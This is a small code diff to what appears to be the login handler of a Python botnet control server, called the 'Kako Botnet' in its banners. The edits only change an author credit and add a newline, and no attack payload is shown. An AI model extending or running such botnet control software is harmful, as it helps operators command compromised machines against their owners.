@@ -56,7 +56,6 @@ def clientThread(conn):
 		    conn.send(prefix)
 		    return conn.recv(512)
 
-
 		def password(conn, prefix="Password: "):
 		    conn.send(prefix)
 		    data = conn.recv(512)
@@ -75,10 +74,10 @@ def clientThread(conn):
 		nickname = nickname(conn)
 		if rank.startswith(rankAdmin) and password.startswith(pwordAdmin) or rank.startswith(rankGuest) and password.startswith(pwordGuest):
 			conn.sendall("[>] Welcome to the Kako Botnet [<]\r\n")
-			conn.sendall("[?] Please use the custom client.py made by Law\r\n")
+			conn.sendall("[?] Please use the custom client.py made by Feitan\r\n")
 			conn.sendall("[?] Or else it made not work as its been untested with other clients\r\n")
 			conn.sendall("[?] Type >help for a list of commands\r\n")
-			conn.sendall("[?] Your nickname is: %s" % nickname)
+			conn.sendall("[?] Your nickname is: %s\n" % nickname)
 			while True:
 				try:
 					message = conn.recv(512)
